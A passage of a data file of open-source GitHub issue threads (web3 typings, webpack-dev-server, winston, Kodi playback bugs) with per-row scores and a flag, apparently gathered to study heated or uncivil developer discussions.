train of thoughts.  And another question for you all What about flow? Should we add flow typings too? Facebook is using flow!  Yes thats what I'm doing currently and will do it as long as I work for this lib. I think we can test them with for example  I have to write the types by my self and I think that will not happen so often. No you didn't you were just quoting the TS documenation but you never really explained the thoughts behind it. The TS documentation does not explain it either. I think I could add for example this  to the publish process to generate them. Idk how good this is but maybe that could be a solution. I'm not saying that I like one of the solutions more then the other but until now I can't see a reall killer argument that we should have them on DT. I think thats more an ethical thing. üòÖ  Just do what you want if you do not want to listen to reason. This is going to be a fuckup! At least I told you so.  oh and  has their own types and it's a JS project   and  both a ""fuckup""? @friend I have stated valid points here.. you have not really replied to any of them. üëç  I understand your argumentation. You will from now on review every pull request and your super powers will make sure that every change to the API of the library or any of the sub-packages will be reflected 100% in the typings here in the repo. I say You will fail! And you say No I have my superpowers. Which is fine. But I will not waste more time on this. Do it then. It will be painful and hard and you will fail. Lets talk again in a year.  And btw If at some point you decide to rewrite the whole codebase in TS, that does not count as a success, but a fail too, right? Because that is what you want to avoid with your approach.  Ah and I forgot to predict something You will have hundreds of issues from Windows-using script kiddies who cannot use Typescript right but will blame you for ""incorrect typings"". They will all go on the backlog and jam it.  This is already happening @friend , this is what this discussion is all about. Apparently all of us TypeScript users are ""script kiddies"" and yes, we're complaining about this library breaking every time you update it. If you want us ""script kiddies"" to stop complaining, then just do the right thing and fix the problem. You have a bunch of people saying they'll even help fix the problem, which you don't seem to want to accept. ü§¶‚Äç‚ôÇÔ∏è  I maintain (with others of course) the  package. If the maintainers of  would drop typescript support, they could just close every typescript related issue and save time and money. And I repeat If you all want that this library supports typescript itself, then JUST WRITE IT IN TYPESCRIPT!  Well, i've been having this page opened for the whole afternoon and i must admit i'm quite amazed by how this has gone to some flames. As JS &amp; TS developper, in normal times, i would have been supporting separated repo for providing types,  as requested by @friend, as i rather prefer avoiding to have any broken type provided by the original repo, third-party packages being easy to remove without touching web3 original code. However, as i read the answers it seems quite technically feasible to ensure types are correctly written before merging any PR, as @friend provided tools &amp; examples of others projects  doing so. Comment from @friend here   also makes me think that rewriting web3 into a TS form might be quite faster as it could be expected. If web3 dev team commits to review type definitions while a typescript migration is being built, i'll definitely support it, they made their point. @friend  i don't think it's about winning or failing here but rather having a collective conversation about how to do it the best way possible. Too bad to have thrown useless flames for that. In any case, and still, thanks for providing . Much datalove  @friend I think people who do this like  and  are doing just fine with this approach. Big repos with millions of downloads a day do this and succeed without  üòÉ I maintain (with others of course) the @friend/web3 package.tstsjsts` will come üòÑ. @friend will have a roadmap for this. Thanks for the good discussion though @friend i do respect your views and no hard feelings üëç  If everybody here speaks Typescript then there is no reason not to write this library in Typescript. I repeat again One can incrementally migrate a library to typescript. But that requires some Typescript skills.  I will lock this issue now because I think we already seen all the arguments. Thanks everyone for the effort to be a part of this discussion! ",101,36,472,0.230769231,0.326923077,433,30,y,
webpack-dev-server/webpack/1220,0.123738945,webpack,webpack-dev-server,WatchOptions passed from command line don't override config,3522,34,18,0.6,3," Operating System  Node Version  NPM Version  webpack Version  webpack-dev-server Version ,  (both)     [x] This is a bug [ ] This is a feature request [ ] This is a modification request  Code Expected Behavior Command line arguments for  should be used Actual Behavior I don't think they are. For Bugs; How can we reproduce the behavior Invoke from CLI as above. Notes Got here from  The code in  would seem to disagree with this assessment.  example for  also works as expected. And the docs don't show the flags as options that you expect to be working. Your  should be in a config. This looks like a classic case of misuse.  @friend is the CLI's  output incorrect or are my expectations incorrect?  Can't speak for most  consumers, but personally i tend to reference  pages and  output 1st and web documentation if I need further explanation. My expectation was that CLI flags take precedence and were reconciled with config somehow. I think myself (and potentially others) are either misinterpreting the  output or perhaps the -related flags indicated from  are inaccurate?  That's a personal choice of course, but I'd highly recommend reading the actual docs next time before submitting an issue for any project. I don't know as if it holds true that  and  are the definitive source of info for modern-day tools outside of some hardcore CLI idealists. None the less, what we have here is a display bug resulting from combining 's CLI configuration with  to get some common config for free. See  that's adding flags from  that  doesn't support. The docs for this module are correct, the output on the CLI is not. We'll track a new issue to see if we can resolve that. But the takeaway here is to always check the actual docs.  I'd neglected to put this in the response above, but want this to stick out for others who might happen across this issue in the future Note the first three lines of the CLI output The important bit there is  as the CLI is pointing users towards the proper docs even in the  output.  @friend Thanks for taking the time to develop a valuable tool and taking the extra effort to document it. What @friend did may not be how you operate, but it is a very common pattern for a huge group of users ""out there""  If you are on a command-line interface, the first thing you do is ""man tool"" or ""tool help"", ""tool -h"", etc. And if the output is too large, the first natural thing to do is grep the output or ""Cmd + F"" Also, properties from the CLI overriding default values or configurations is the common behavior for most CLI tools, it's the ""least surprising behavior""  You are of course free to deviate from the pattern, may I suggest to simply remove the whole output of ""--help"" and replace it with the ""Usage"" link? That would be easier than trying to change people to abandon behaviors that have been proven useful since at least the late 1970's  @friend seriously?  @friend replies of that nature are not helpful and do not contribute to the discussion. please refrain in the future.  @friend let me then elaborate on it so it valuable to the discussion. Keeping documentation in sync with the actual behavior/options of the tool ( be it online or in the tool itself) is fundamental and not something that only ""some hardcore CLI idealists"". It is simply quality of your product. I see you are listed as the 3rd most active contributer on the project and seeing you writing something like that is just bad for the project itself and the JS community in general. This is not idealism is QA! ",12,2,105,0.1,0.3,97,5,n,
winston/winstonjs/1158,0,winstonjs,winston,Use ES6 promises and better document state callbacks/events,709,11,5,0.75,0,"I'm having a lot of issues testing Winston satisfactorily.  I blame this on the lack of promises used, the atypical style used in the code (readability), and the use of the async file calls/undocumented event emitters. My use cases are very common.  I want to author a test that verifies a log file has been created, and it has been written to.  I've spent literally hours without success figuring out what Winston is doing.  That really is not good. Net effect my perception is that Winston has a lot of bells and whistles (I still don't want to reinvent log rotation), but it's probably contributed to by too many people, its issue log has some serious issues noted, and it fails to implement simple cases. ",0,0,22,0.125,0.125,11,0,y,
winston/winstonjs/1377,0.057244412,winstonjs,winston,"V3: New formatters are not equivalent to old formatters, broken logs after migration",3059,34,41,0.375,9,"  Please tell us about your environment   version? [ ]  [x]      outputs v10.4.1 Operating System? macOS High Sierra v10.13.5 Language? ES6  What is the problem?  I've followed the [upgrade to 3.0]( doc, and when I was done, my logs were broken.  V2 supported multiple arguments to log functions, and using common format options, pretty printed Objects/Arrays/Errors nicely.  So these logs worked in V2    &lt;img width=""415"" alt=""screen shot 2018-06-24 at 18 51 16"" src="" width=""499"" alt=""screen shot 2018-06-24 at 18 52 47"" src="" width=""1083"" alt=""screen shot 2018-06-24 at 18 51 47"" src="" in V3, multiple arguments are no longer supported, only  is supported and only as an Object. Plus the equivalent formatters do not yield the same result.    &lt;img width=""551"" alt=""screen shot 2018-06-24 at 19 27 33"" src="" if I add the  formatter, it's still not the same  &lt;img width=""817"" alt=""screen shot 2018-06-24 at 19 28 02"" src="" What do you expect to happen instead?    The migration doc should mention this fundamental change in behavior and how to resolve it Multiple arguments are treated differently Objects as  are not pretty printed Error Object is ignored (I saw there's an open issue for that) Formatters order matters   I think Winston should support the multiple arguments notation, as it is a very common usage of  and really is much easier to use when you need to log a string and then an Object, etc. (specifically when using the Console transport). The new formatters should yield the previous behavior when using the same setup     plus one The documentation is a bit superficial regarding  and the provided examples such as this one do not result in the expected output.  PR would be welcome to update that example @friend. Will take a look at this in depth and see what we can do to make the transition easier.  Also @friend ‚Äì¬†winston does support the multiple argument notation, it's simply not enabled by default because it is a performance hit and as such opt-in. Use .  @friend I can gladly post a PR but currently I'm unable to understand how to obtain the standard notation. I tried adding  I just get a weird message like the ones shown by @friend.  I was making the same comments (objects/arrays) aren't formatting the same in the Gitter chatroom.  Seems that the previous options.meta isn't treated the same way.  Would be great to understand the differences and how to fix moving forward.  plus one After maybe 2 hours of trying to obtain the same logging format in V3 as in the previous version, I have to say I have to downgrade. I like the custom formatter and format.combine and everything, but either  coloring doesn't work simple format output doesn't work (no JSON) printing out objects (JSON) doesn't work - I don't see any reason why use custom formater with JSON.stringify or combination of the above  I just want logger.error(""error""), logger.info(object), logger.info(array) and no hustle.  All of those features work. If you'd like to share a code sample along with your shade that would be much more constructive. ",9,0,152,0.25,0.375,73,5,n,
xbmc/xbmc/14675,0.28668108,xbmc,xbmc,"Framerate change not work in 18, both x32 and x64",1662,5,7,0.666666667,0,"Auto framerate change broken in Kodi 18. When I play 1080/50i video in Kodi17, it's change framerate on TV. There is nothing happens in Kodi 18, both x32 and x64. Fullscreen mode (not windowed) and autochange are enabled in settings. But fullscreen mode not work too, it's look like windowed mode forced. There is no ""SetFullScreenInternal"" in Kodi 18 log, like in 17. kodi17.log kodi18.log  Have you enabled Whitelisting? Also you did not follow our issue template  WTF is Whitelist ? Why it's empty by default ? Where it placed ? Why google not found it ? Why you broke years-worked setup and add hidden 'feature' and there is no information or attention in download section about this incompatible issue ? You can warn users in ""Download"" section, you can warn users on installation phase, you can open whitelist tab on first run, you can show some window on playstart with attention ""This resolution and framerate not in whitelist, do you want to add now?"" Instead, you simple do nothing, and every user spent weeks to find this error or to rollback to previous version. Too bad, Kodi, too bad.  Jeez stop whining.  With that attitude no one will care to even try to improve it. Also no one forced you to update so you can of course blame yourself  you realize that v18 is still not released, right? When implementing the whitelist approach (because of user demand) we decided to do some additional changes to prevent your issue, but unfortunately forgot about it after the feature got in (so many things had been going on in that time). So üëç for the reminder and üëé for not writing a proper bug report using our template and another üëé for your last comment. ",6,0,55,0.125,0.208333333,39,8,y,
xbmc/xbmc/14809,0.1740532,xbmc,xbmc,I can't play some mp4 files.,9652,112,71,0.595744681,7,"   Bug report Describe the bug I can't play some mp4 and vob files. Files are not corrupted.     Your Environment Used Operating system    [x] Android [ ] iOS [ ] Linux [ ] OSX [ ] Raspberri-Pi [ ] Windows [ ] Windows UWP  Operating system version/name  Kodi version 18 rc1   note Once the issue is made we require you to update it with new information or Kodi versions should that be required. Team Kodi will consider your problem report however, we will not make any promises the problem will be solved.  Where's the debuglog that was asked and sample files? A screenshot is useless  I don't know how to upload log from Shield device. I need some time to upload files. wt., 6 lis 2018, 1355 Martijn Kaijser notifications@friend.com napisa≈Ç(a)  Please read  how to submit logfiles.  Ok thank you. BTW I'm able to play those files on kodi 17. wt., 6 lis 2018, 1515 DaVukovic notifications@friend.com napisa≈Ç(a)   is one whish I can't play.  hello, just downloaded you file and its playing fine. (Nvidia Shield - OS Ver 7.1 - Oreo 8.0) do you have access from your pc to the shield? then go to this folder internal\Android\data\org.xbmc.kodi\files\.kodi\temp - there is the log  Which kodi version do you use?  kodi 18 latest nightly. without a debug log, nobody can help you!  Could we please see a debuglog, now? You could also use the Logfile Uploader add-on to do so. That simply takes only a few moments. We can't help you without that Logfile and your issue might get closed without it. Thanks in advance  @friend your files simply cannot be accessed  I can play few files from this folder and few don't. I know know what's going on. In kodi 17 I'm able to play them all. So where should I look for solution? In pc NFS share settings?  NFS3ERR_NOENT(-2) means file not found, or like Irusak said, its not accessable. this could mean wrong rights or files are moved somewhere. when i told you its working for me, i tried that too over NFS from my nas with NFS V3  I think this can be better taken to the forums, perhaps somewhere there can help you track down your NFS issues.  @friend had similiar problems in 2012 with, just found an old support ticket,  I use hane winnfs server and I'm almost sure that settings are fine.  I tried today kodi 17 from Google play on shield tv and on my smartphone. On both devices I can play those files without any problems. So there is something wrong in nfs share support implementation in kodi 18.  Rather looks like your setup as it works for others using NFS. Am Fr., 9. Nov. 2018 um 2231 Uhr schrieb kolunio82  notifications@friend.com --                     Key-ID     0x1A995A9B                keyserver pgp.mit.edu  ============================================================== Fingerprint 4606 DA19 EC2E 9A0B 0157  C81B DA07 CF63 1A99 5A9B  I tested on the shame shield tv device in the same my home network. Only change is replace kodi 18 to 17 from Google play.  Post a log for both please. Am Sa., 10. Nov. 2018, 0941 hat kolunio82 notifications@friend.com geschrieben  this one, right nfs//192.168.1.31/z/movies/MUSIC/TiÔøΩsto - Live @ Tomorrowland 2017 (1080p_25fps_H264-128kbit_AAC).mp4 ? Wondering if ÔøΩ has something to do with it in comparison to v18 log @friend If you rename this one to Tisto - Live at Tomorrowland 2017.mp4 does it start to work?  Nope crashes to desktop.  Mmh - works from non Android kodis, right? If you could provide an adb log that would be really helpful  Ok I know what is wrong but I don't know how to fix this. When filename contains other letter than from English I can't play the file. I replace Ti√´sto to Tiesto and it works.  @friend i have downloaded this file and tested on my shield, file location is on qnap nas with nfs. for me its working.. @friend  i think its logcat he wants, download adblink and enable in shield under developer options network-debugging. then  with adblink open ADB shell. logcat -d -f /scdard/logcat.txt  @friend good - this is what I asked you above. So in short we have an issue with passing the ""correct"" encoding so that it is understood by the other side ... @friend logcat is not needed. The error is clear now. It's this   So there is a easy way to fix this? I tried to change language settings in kodi but doesn't work. Also I tired to change filenames display mode in server settings from UTF-8 to windows ansi. But when I change to ansi kodi doesn't see files with others characters at all. )  Nope - no easy fix. I pinged the guys on IRC. Let's see ... still wondering why it only misbehaves on Android and other kodi v18 work with the same NAS. I did not expect that this is ""platform specific"" code.  @friend ok, its the √´ that couse this problem....but why is it working for my nvidia shield with android and qnap nfs? i did not renamed the file  You really ask? -) ... It's Microsoft on the other side ...  ) ok i understand, thank you  So the question is why KODI 17.6 can play those files and KODI 18 don't. )  is you server on latest version?  ok, then you have to wait, until fritsch talked to the guys on IRC. @friend why do you think the problem is only on android. did i miss something here?  I don't think this is only android problem. Tomorrow I will try kodi 18 on windows 10 and I'll let you know.  I don't think it is only Android, but for now no one told differently. So based on the information in this bugreport it's Android + Windows NFS for now - in this combination. It even worked with just ""changing"" the NFS server to a QNAP one. So most likely it won't work with kodi v18 on Windows as well in combination with THIS nfs server. We will see. As I neither use Microsoft Windows nor Android with a Windows NFS - I cannot really reproduce.  So I still have this problem and It's not fixed.  Did you test that already? If so, what was the result and where is the matching debuglog then?  Latest kodi build win x64.   with english characters works. Withs any others than english don't.  Why bug is marked as invalid? I had still this problem in kodi windows and in kodi Android.  I marked it invalid 21 days ago and told you to go to the forums. Until we verify this is an actual Kodi bug, it really has no place here. That being said, on the forums there will be most likely some people willing to assist.  Forgive me please but I don't understand exactly what should I do now? I posted log from kodi Android and kodi windows 10 and I'n both of them I have the same problem. So I should ask people on forums if they have the same problem as I?  You should go there, open a thread and ask people to help you troubleshoot why your NFS server has incompatibility with Kodi 18. For reference, myself and loads of others are opening files with crazy characters from all kinds of NFS servers with Kodi 18. You haven't convinced us it is not a bug with haneWin. (I would say we are only getting more and more convinced it is.) We can definitely help you troubleshoot why it becomes visible in 18 and not 17 though - for this you will likely need to do a lot more testing, so prepare your debug logs. It would also be extremely valuable if someone could reproduce the bug and help you troubleshoot. The forum is the place to do this - especially since every comment here spams everyone involved. Github issues is not a replacement for the support forum - it is for technically reporting errors with Kodi code that need to be fixed.  From HaneNFS serwer author ""tested an elder VLC on Andorid 4.4 and the latest vlc version on Android  8.0 without any problems. I also verified that non ASCII characters are  ok in VLC on Android. Best regards, Herbert Hanewinkel"" So if HanesNFS works without any problems as nfs server for VLC answer for me is obvious - kodi is responsible for error. Another proof is that kodi 17.6 works fine and 18 don't. Fix your software and don't blame haneNFS.  What is the link to your forum thread you opened so we can help you find enough info to fix it  - (whether that is in hanewin or in Kodi does not matter really ) I offered help a few times and said there is not enough info for this ticket. I have been nothing but clear about the need to open a thread on the forum for this, so the issue can be reproduced. You keep posting partial (and not nearly enough) information here, and now have added a more than unwelcome negative attitude on top of it. I'll give you a last chance to open a forum thread and link to it here. After that I will simply close communication as I prefer not to deal with people who are not willing to work together  to solve an issue.  I've done this arleady -  I show you video with error step by step -  should I give you more?  Nothing. This ticket is closed for communication, and we can reopen it when we have enough information collected (through the thread) to actually fix something - if the issue is indeed in Kodi. EDIT I just looked at your thread and it contains even less information than the sparse information in this ticket. I suggest you reread everything I said so far, and create a support thread in the forum, or edit your previous thread and forum title. Post as much information as you can in it and hope someone can reproduce it. I will reiterate it once more We can not reproduce the issue with any normal NFS setup so far. It is cool you got someone to test another app and this NFS server, but it is no definitive answer. To highlight this   several of our team tested the same app and another NFS server and there are no issues either. This means there is some weird incompatibility specific between HaneWin NFS with your settings in it + Kodi 18 with your settings in it. This will require a lot of testing on your part. ",47,47,398,0.191489362,0.212765957,369,21,y,
xbmc/xbmc/15405,0.10037075,xbmc,xbmc,Kodi 18.0 stutters when playing DVD files (VIDEO_TS) on Fire TV,22085,217,225,0.403508772,16,"Bug report Describe the bug I am running Kodi 18.0 as a fresh install on an Amazon Fire TV 3rd gen (2017). When I try to play DVD files (VIDEO_TS.IFO) the movie stutters. It doesn't matter if I install over 17.6 or uninstall 17.6 beforehand for a fresh install. It doesn't matter if I play from SMB (Gigabit ethernet, so no speed problem) or from a local directory (/sdcard/Movies). This worked fine with Kodi 17.6 before. Other movie types (i.e. MKV) are running fine. Expected Behavior DVD videos play smoothly. Actual Behavior DVD videos start to play, then stutter. Audio stutters a little later (after 10 seconds). To Reproduce Steps to reproduce the behavior  Use Amazon Fire TV 3rd gen (2017) Copy a DVD structure below /sdcard/movies AUDIO_TS VIDEO_TS VIDEO_TS\VIDEO_TS.IFO VIDEO_TS\VTS_01_0.IFO VIDEO_TS\VTS_01_1.VOB VIDEO_TS\VTS_01_2.VOB ... Install Kodi 18.0. Add /sdcard/movies as Data source Play the movie. It stutters.  Debuglog The debuglog can be found here  Environment Used Operating system  [x] Android  Operating system version/name Amazon AFTN with Android 7.1.2 API level 25  Amazon software version Fire OS 6.2.5.8 (NS6258/1607) Kodi version 18.0 Git20190128-d81c34c   Out of curiosity I installed Kodi 18.0 on my phone (Moto G6 plus running Android 8.0) and my tablet (Google Pixel C running Android 8.1). I was not able to reproduce the problem there. So it seems that the issue is related to the Amazon Fire TV.  Jep - mediacodec is as stable as the vendor implementation -) On your FireTV try to disable ""Mediacodec and Mediacodec Surface"" before playing the DVD please. Don't forget to turn it on again afterwards.  This indeed helped. Thank you. I am sorry but I fail to make sense of this.  If ""Mediacodec"" is something within Kodi then Kodi 18 introduced a bug that wasn't present in 17.6. In this case a reference to the vendor implementation would not apply. If ""Mediacodec"" is something within Fire TV then it is still the same as it was with Kodi 17.6. Why would it be less stable when used with Kodi 18.0?   No - in v17. Mediacodec was disabled by default for DVDs. Some forum users forced us to enable it by default - screaming loud and shout, you know.  Well, now you have me screaming and shouting ... How about a switch like ""Disable Mediacodec when playing DVDs""?  Nope - we rather want that FireTV people just fix their decoder -) ... and this won't happen if we add workaround after workaround.  Im sorry, but I disagree. you can't expect Amazon to fix something they don't have any reason to consider broken. From their point of view anything not working in Kodi on FireTV is fine. FireTV is a vehicle to sell more Amazon content, not a friendly and cooperative environment to run things that tend to sell less Amazon content. Obviously this Mediacodec topic is a thing that makes people unhappy. Some want in on by default, some want it off by default. I propose to have it on by default unless the content is a DVD. That seems to be what it was before Kodi 18 and I never even noticed its existence - it just worked. Now it is on by default and I am forced to switch it off manually when playing DVD content. So by removing a ""workaround"" (I would prefer to call that a ""feature"") you force me to manually toggle a switch that is hidden in the advanced settings - probably for good reasons. I would prefer not having to fiddle around in settings every time I change the type of content I intend to play. Please reconsider my request to introduce a setting ""Disable Mediacodec when playing DVDs"". It doesn't look like a complicated thing to implement.  We can expect a lot of thing from Amazon. We also expect users to understand why we do certain things (do not workaround broken firmware by adding stupid switches).  We did not make the decision for you to buy an Amazon device that has clearly not been designed to play such files. So i suggest to find some other device then.  Actually, we are at a point where a perfectly working feature has been removed from Kodi between 17.6 and 18.0. I prefer to not throw around the word ""stupid"" but deleting something that made Kodi work out of the box for anything thrown at it and instead have users fiddle around in advanced settings does not look like a completely mature and understandable decision to me. I do not know how I deserve to be treated in that manner. I asked politely about the circumstances and after I read the facts that have been told here I asked politely to add a switch that brings back a deleted feature. Also I disagree about the FireTV ""clearly not been designed to play such files"". Kodi on FireTV played them perfectly until 17.6. It does play them perfectly in 18.0 if I fiddle around in advanced settings. My request is to reduce the necessary fiddling. The Wiki ( says ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."" That sounds like the mere definition of ""FireTV"" to me. We all know that Android is a heterogeneous market. Nearly every device has this or that shortcoming. No reason to throw the FireTV out of the window.  Your argumentation is fully correct. Perhaps amazon did not even try to fix it, cause we had it off in the past ... pure speculations. I don't like when users suffer though. Okay with a custom v18 build that disable Mediacodec for mpeg-2?  Here  - results will be called androidswmpeg2 - it will (other than the name tells) stop dvd acceleration for mediacodec - result is uploaded here  in some minutes.  I'm probably facing the same issues as Robert Dahlem on my Beelink GT1 with stuttering dvds. I'll try the test build and will report the results later.  I tested kodi-20190203-6958f4c5-androidswmpeg2-armeabi-v7a.apk as fresh install as well as installed over my 18.0 configuration. It plays DVDs perfectly without stuttering now. Thank you!  I also have the same problem but on .avi files (mpeg4 - xvid codec). Disabling mediacodec works fine (stuttering is gone) - But more cpu load and way more battery usage coz of disabling hardware acceleration. Also tested that Kodi build from @friend - but didnt solve my problem (sure, its another codec). But generally with the build from @friend other codecs are playing better (I think) - less cpu load on activated hardware acceleration Edit Android 8.1 (non rooted) Google Nexus 5x Problem recognized since Kodi v.18.0 (clean installed w/o any plugins from google play store)  Playing dvds works fine in this version. I only had to change a system setting for DTS sound to work correctly.  I can disable for mpeg4 &lt; 720 width again. Will upload a tesbuild tonight. Am Mo., 4. Feb. 2019, 1325 hat Markman-B notifications@friend.com geschrieben  Nice thank you (just for interest the only mpeg4 files I have tested was SD quality). So like mpeg2 before - you only disable hardware acceleration for this two codecs ? Is there anyway to fix later ? Sure the problem is gone for now but the downside is more battery usage (cpu load). So i think for future proof is to fix it not only disabling it or is there some misunderstood of me ? EDIT I am not that Android pro and not familiar with android coding and so on...  No problem. Let's try. Am Mo., 4. Feb. 2019, 1606 hat MisterT87 notifications@friend.com geschrieben  sure - can you link it here if build is ready ? )  Will result in very same folder in roughly 60 minutes. More I cannot do for you. Bye -)  Finally some sanity after @friend's well constructed argument. @friend is this just for mpeg2 DVD's or all mpeg2 content &lt;720 ? Any chance we can get All &lt; 800 mpeg2 content SW decoded by adding  test - kodi-20190120-fe68d404-powrevert-armeabi-v7a.apk with commit # fe68d404 is the best I've seen EVER for Android Leia SW decoding and rendering performance on ARM platforms. # d2f0c5f was also good. Tested on a GLES 2.0 Oreo Mi Box and GLES 3.2 MM MINIX U9. Basically I'm trying to get 25i/720x576 mpeg2 DVD's and broadcast TV SW decoded and deinterlacing on Android ARM, without fiddling incessantly with acceleration settings. Current androidswmpeg2-armeabi test .apk's above do not default to SW decoding for 25i/720x576 mpeg2 TV., prob because you are using if (hints.width &lt;= 700)  Better use this  - the rest is only hackery ... it has settings for h264, mpeg2, mpeg4(xvid) and uses the powrevert ...  Thx. That will fix everything. EDIT it's on Kodi test servers... Yes that works nicely for 720x576 SW decoding and rendering, but All acceleration options have gone missing in Kodi settings. That whole section is missing.  Tested this APK mpeg4 videos still stuttering like before (with hardware acceleration enabled) ( XBMC Player info from tested file Decoder amc-mpeg4(S)(HW) Pixel-Format Surface MediaInfo AVI 1. Video-Stream MPEG-4 Visual (XviD) 1687 kb/s, 720x400 (169) @ 25,00 fps, MPEG-4 Visual (XviD) (Advanced Simple@friend) (BVOP1)  @friend can you try this instead for SW decode &amp; settings options  to runtime test on AML Linux Leia...  No time. Feel free to fix it up or send a PR. Remember Android specific settings should not bloat settings.xml which is why I tried to move it to android.xml where it's place is Whenever you send a PR to my repo I will start a build. Am Di., 5. Feb. 2019, 1036 hat wrxtasy notifications@friend.com geschrieben  Ok, cool. PR inbound to test shortly. Done.  For good reason. SW rendering performance has dramatically been degraded. With that approach, neither HW nor SW would have worked flawlessly on the Fire TV. HW decoding DVD/MPEG-2 still works on many devices. And for those devices where it does not work, MediaCodec can be disabled manually. So it still works. Forcing SW decoding means far (and I really mean far) inferior scaling and deinerlacing on modern TVs. And there has been no way of enabling HW decoding in V17 Krypton. So what's the better solution? Kodi V17 performed ""SW emulation"" to get it working. With this android.xml approach, those switches are not accessible by the user either as far as I can see. What about @friend's mentioned blacklist approach?  That is not my observation. 17.6 silently switched off Mediacodec for DVDs and fell back to SW rendering with flawless performance. 18.0 did not automatically switch off Mediacodec, DVDs stutter. When I manually switched off Mediacodec DVDs worked. Fritsch's version (18.1 RC1) returned the 17.6 behaviour and DVDs worked out of the box. To sum that up on todays FireTV DVDs do not work with HW rendering and work with SW rendering. I do not dispute that. That leads to a user annoyance we have at least on device (the FireTV) where you would need to manually switch on or off Mediacodec depending on the type of content you watch. I do not advocate ""forcing SW decoding"". What I request is a configuration option that allows me to use Mediacodec in the default case and to switch it off explicitly for DVD material. The former we have already, the latter is my request. Ideally it would switch off DVD HW rendering automatically (like in 17.6) but only if FireTV hardware is detected. One can dream ... I do understand that additional switches are a disputed topic. From my point of view switches come into play when you can't make a sensible choice fitting all cases. Forcing the user to change a setting each time they change content type is not a sensible choice. Deliberately sabotaging DVD playback on the FireTV to force Amazon to fix their Mediacodec will produce nothing you can force Amazon to nil. Instead, users will only see that DVD playback does not work with Kodi 18.0 on FireTV and will stay with 17.6. That is one way to go blacklist Mediacodec for combinations of hardware and content type that are known to malfunction. I would still opt to make that user configurable so people can experiment (i.e. when a new FireOS comes out).  True. Final V18 fixed the SW rendering bottleneck, or at least mitigated it, enabling proper playback of 25fps (incl. interlaced with deinterlace-half) material. All I wanted to say was that people have been asking for HW decoding when SW was badly broken, countering @friend's alternative facts. I think that the real issue is understood now and that it might be safe to re-enable SW for DVD and MPEG-4 ASP SD by default. Probably all of today's Android TV devices can cope with that. SW decoding has quite some downsides though (performance- and quality-wise) and since many devices properly support HW decoding, forcing SW would't be a good solution IMHO (which I understand you are not advocating).  I just downgraded to 17.6 to check that. DVDs play fine if Mediacodec is switched on or off. So, no V18 fixed nothing with SW rendering that needed to be fixed, at least not on FireTV. ""Alternative facts""? Do you consider this a contribution to the discussion which should be taken seriously? Because I have my doubts.  I meant V18 final relative to earlier V18 RC/nightly builds. Anyway, doesn't matter indeed. A good solution needs to be found.  Here you go. There is a solution but it's unacceptable to the Kodi codebase gatekeepers. I cannot be bothered trying to implement an alternative solution at this time, nor spend time Android compiling. It uses the same user configurable HW SW switching as SPMC 16.x / 17  will also need this set of @friend patches for better ARM rendering performance  compile away and Android AML and Fire TV users will have a workable solution.  IIRC, the issue is very specific to MPEG2 from dvd, which has some peculiarity (that I can't remember right now) that some h/w decoders chokes upon. Just bring back ""hints.dvd"" from  , one way or another ;) PS Oh  sure why users would scream if DVD MPEG2 is SW decoded? Thanks for the ""quick hack"" comment, btw. You're welcome to try to convince Amazon to fix the issue ;)  People screamed because SW wasn‚Äòt feasible anymore due to a bottleneck in the GLES rendering path. SW means far inferior PQ. HW deinterlacers and scalers are so much better.  Oh, so Kodi went to the quick hack rather than fixing the GLES rendering path? Hehe... I think I remember the issue is specific to DVD on filesystem, btw. Pretty sure ISO's didn't have the issue.  A good example is the bugs bunny NTSC iso (VOB container + mpeg2) Does not work at all with h/w on both AFTV devices, but they stutter differently. This ISO plays well on WETEK Hub and shield b.t.w.  Hi, thank you fritsch for your build!  However it has a problem -- the hardware acceleration options do not show under ""Player"" menu.  I modified your build and re-compiled Kodi, putting the settings back into settings.xml instead of android.xml.  This fixed the problem and now there are user-configurable switches to turn software decoding on/off/HD only for mpeg2, mpeg4 and h.264. Here is my build apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodiapp-armeabi-v7a-debug.apk I tested this apk on my fire TV 3 and everything works perfectly, DVD, HD, 4K, HDR, autoframerate, etc. This is my first time buiding Kodi.  I am concerned about apk size -- it is over90Mb, whereas your apk is about 60Mb.  I suspect the standard ""make apk"" command maked apk with debugging information -- how can I make a smaller ~60Mb apk?  Yes. I know, just one number is wrong in android.xml. But I stopped caring. There are guys in this thread knowing better anyways, let's wait on them. Talk is cheap, you know -) Am Mi., 20. Feb. 2019, 0357 hat Aleksey Zimin notifications@friend.com geschrieben  I would just like to have a working Kodi that plays everything on my Fire TV -)  Now I have it and everything works to my satisfaction! In the future Android ARM devices will have more powerful CPUs, but support for older codecs may disappear from firmware alltogether. Thus there is definitely need to have SW decoding to fall back on.  Out of curiosity, which number is wrong in your android.xml?   be group id=""3""  I have cloned the Kodi master branch, and introduced the same changes into settings.xml, Settings.cpp, Settings.h, and DVDVideoCodecAndroidMediaCodec.cpp.  Compiled and tested -- works just fine.  Plays all DVD ISOs, Blu-ray ISOs, autoframerate, 4K, HDR, all works.  I am running GUI at 720p to allow TV to do the upscaling in most cases, because Kodi does not seem to be able to lower its resolution, i.e. when GUI is set to 1080p, it will upscale all videos to 1080p. Kodi still upscales 480p and 576p files, but this looks fine. Here is the apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1master-armeabi-v7a-androidswmpeg2-mod.apk the apk compiled from fritsch's fork branch androidswmpeg2 with my modifications is here ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1RC1-armeabi-v7a-fritsch-androidswmpeg2-mod.apk As far as I can see these apks work the same on my Fire TV 3 pendant.  I am posting this apk for those users who are unable to compile Kodi, but would like a working alternative 18.1 release (or 18.2RC) with SW decoder switches.  It still puzzles me why Kodi developers do not want to include these switches into the main build -- they do not hurt anything, and they help many users of popular Fire TV and other non-Kodi-oriented hardware.  @friend Thanks for the new builds. Quick question - I wasn't following the difference between the two apks. What is the difference?  Stop posting these builds and whatever. They bring absolutely nothing to this created issue ticket. If this continues i will close and lock it  With all due respect, there would be no need for these builds and for this whole thread if developers of team Kodi agreed to allow users to choose to use SW decoding for codecs (mostly mpeg2 and mpeg4, and interlaced h264) that are poorly supported on popular, but NOT designed for Kodi use, platforms like Amazon Fire TV.  I do not think that Amazon cares to support mpeg2 and interlaced formats properly because they have no use for it, and so one would not expect them to work on proper implementation.  Go buy a different device is my advice  I agree with @friend.  Amazon has no incentive to fix this, but team KODI does.  KODI should be user driven, and I don't understand why you wouldn't accept code that is already available in order to make all users happy with your platform?  Who would be upset by the ability to make all devices 